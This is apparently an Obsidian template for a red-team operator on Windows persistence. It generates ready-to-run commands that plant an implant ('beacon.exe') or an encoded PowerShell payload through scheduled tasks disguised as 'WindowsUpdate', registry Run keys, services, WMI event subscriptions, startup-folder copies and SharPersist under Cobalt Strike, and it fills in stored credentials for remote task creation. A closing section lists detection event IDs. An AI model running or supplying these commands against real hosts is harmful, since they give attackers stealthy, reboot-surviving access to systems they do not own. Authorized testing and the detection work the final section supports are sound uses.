---
# Attack-specific fields
persist_method: scheduled_task
persist_target_host:
persist_target_fqdn:
persist_command:
persist_task_name: WindowsUpdate
persist_reg_key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
persist_service_name:
notes:
---

# Persistence

> [!abstract] Attack Summary
> Establish long-term access that survives reboots and session timeouts. Techniques include **Scheduled Tasks**, **Registry Autoruns**, **Windows Services**, **COM Hijacking**, **WMI Event Subscriptions**, and **Certificate-Based Persistence**. Choose the technique based on privilege level and stealth requirements.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["LHOST",    b?.lhost    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const methods = ["scheduled_task","registry_run","windows_service","wmi_subscription","startup_folder","com_hijack"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Target Host",       `\`INPUT[text(defaultValue("${p.persist_target_fqdn || b?.target_fqdn || ''}")):persist_target_fqdn]\``],
  ["Persistence Method",`\`INPUT[inlineSelect(defaultValue(${p.persist_method ?? 'scheduled_task'}),${methodOptions}):persist_method]\``],
  ["Task/Service Name", `\`INPUT[text(defaultValue("${p.persist_task_name ?? 'WindowsUpdate'}")):persist_task_name]\``],
  ["Command to Run",    `\`INPUT[text:persist_command]\``],
]);
```

---

## Method A — Scheduled Task

> [!info] Runs at specified times or events. User-level (no admin) or SYSTEM-level (admin required).

**Windows — Cobalt Strike / schtasks**
```dataviewjs
const p = dv.current();
const taskName = p?.persist_task_name || "WindowsUpdate";
const command  = p?.persist_command || "C:\\Windows\\System32\\cmd.exe /c beacon.exe";
dv.paragraph("```bash\n# Create task running as SYSTEM (admin required)\nshell schtasks /create /tn '" + taskName + "' /tr '" + command + "' /sc onstart /ru SYSTEM /f\n\n# Create task running as current user (no admin needed)\nshell schtasks /create /tn '" + taskName + "' /tr '" + command + "' /sc onlogon /f\n\n# Create task that runs every 15 minutes\nshell schtasks /create /tn '" + taskName + "' /tr '" + command + "' /sc minute /mo 15 /f\n\n# Verify\nshell schtasks /query /tn '" + taskName + "'\n\n# Cleanup\nshell schtasks /delete /tn '" + taskName + "' /f\n```");
```

**Linux — Remote scheduled task via NetExec**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const domain   = b?.domain ?? "DOMAIN";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
const target   = p?.persist_target_fqdn || b?.target_fqdn || "TARGET";
const taskName = p?.persist_task_name || "WindowsUpdate";
const command  = p?.persist_command || "cmd.exe /c whoami > C:\\output.txt";
dv.paragraph("```bash\nnxc smb " + target + " -u '" + username + "' -p '" + password + "' -d " + domain +
  " --exec-method atexec -x \"schtasks /create /tn '" + taskName + "' /tr '" + command + "' /sc onstart /ru SYSTEM /f\"\n```");
```

---

## Method B — Registry Autorun

> [!info] HKCU (no admin) or HKLM (admin required) autoruns execute at logon.

**Windows**
```dataviewjs
const p = dv.current();
const regKey  = p?.persist_reg_key || "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const taskName= p?.persist_task_name || "WindowsUpdate";
const command = p?.persist_command || "C:\\Users\\Public\\beacon.exe";
dv.paragraph("```bash\n# HKCU Run key (no admin needed, runs as current user at logon)\nshell reg add \"" + regKey + "\" /v \"" + taskName + "\" /t REG_SZ /d \"" + command + "\" /f\n\n# HKLM Run key (admin required, runs for all users)\nshell reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + taskName + "\" /t REG_SZ /d \"" + command + "\" /f\n\n# Verify\nshell reg query \"" + regKey + "\"\n\n# Cleanup\nshell reg delete \"" + regKey + "\" /v \"" + taskName + "\" /f\n```");
```

---

## Method C — Windows Service

> [!info] Runs as SYSTEM at startup. Requires admin to install. Most persistent but most detectable.

**Windows**
```dataviewjs
const p = dv.current();
const svcName = p?.persist_service_name || p?.persist_task_name || "WindowsSvc";
const command = p?.persist_command || "C:\\Windows\\System32\\beacon.exe";
dv.paragraph("```bash\n# Create service\nshell sc create " + svcName + " binPath= \"" + command + "\" start= auto\nshell sc start " + svcName + "\n\n# Verify\nshell sc qc " + svcName + "\n\n# Cleanup\nshell sc stop " + svcName + "\nshell sc delete " + svcName + "\n```");
```

---

## Method D — WMI Event Subscription

> [!info] Executes payload when a WMI event occurs (e.g., system startup, specific time). Fileless — stored in WMI repository, not on disk.

**Windows — PowerShell**
```dataviewjs
const p = dv.current();
const taskName = p?.persist_task_name || "WindowsUpdate";
const command  = p?.persist_command || "powershell.exe -enc BASE64_PAYLOAD";
dv.paragraph("```powershell\n# Create WMI event filter (triggers on startup)\n$filter = Set-WMIInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n  Name = '" + taskName + "Filter';\n  EventNamespace = 'root\\cimv2';\n  QueryLanguage = 'WQL';\n  Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9\";\n}\n\n# Create consumer (what to run)\n$consumer = Set-WMIInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n  Name = '" + taskName + "Consumer';\n  CommandLineTemplate = '" + command + "';\n}\n\n# Bind filter to consumer\nSet-WMIInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n  Filter = $filter;\n  Consumer = $consumer;\n}\n\n# Verify\nGet-WMIObject -Namespace root\\subscription -Class __EventFilter\nGet-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer\n\n# Cleanup\nGet-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Remove-WMIObject\nGet-WMIObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='" + taskName + "Filter'\" | Remove-WMIObject\nGet-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='" + taskName + "Consumer'\" | Remove-WMIObject\n```");
```

---

## Method E — Startup Folder

> [!info] Drop a file in the startup folder — executes for all users (admin) or current user.

**Windows**
```dataviewjs
dv.paragraph("```bash\n# Current user startup (no admin)\nshell copy beacon.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n# All users (admin required)\nshell copy beacon.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\"\n\n# Verify location\nshell dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n```");
```

---

## Method F — Elevated Persistence (via Cobalt Strike)

**Windows — Persistence at elevated level**
```dataviewjs
dv.paragraph("```bash\n# Elevated: COM hijack for HKLM key (admin)\n# Elevated: Service (SYSTEM)\n# Elevated: Scheduled task as SYSTEM\n\n# After compromising elevated context:\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe -t schtask -c 'C:\\Windows\\System32\\cmd.exe' -a '/c beacon.exe' -n 'WindowsUpdate' -m add -o logon\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Release\\SharPersist.exe -t reg -c 'C:\\Windows\\System32\\cmd.exe' -a '/c beacon.exe' -k 'hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run' -v 'WindowsUpdate' -m add\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Scheduled tasks: **Event 4698** (scheduled task created), **Event 4702** (updated).
> - Registry autoruns: **Sysmon Event 13** (registry key value set) for RunOnce/Run keys.
> - Services: **Event 4697/7045** (service installed), **Event 7036** (service changed).
> - WMI subscriptions: **Sysmon Event 19/20/21** (WMI filter/consumer/binding created).
> - Startup folder: FileSystemWatcher on startup paths; **Sysmon Event 11** (file created).
> - All: Look for unsigned binaries, unusual paths, and base64-encoded PowerShell commands.

---

## Notes & Results

`INPUT[textarea:notes]`
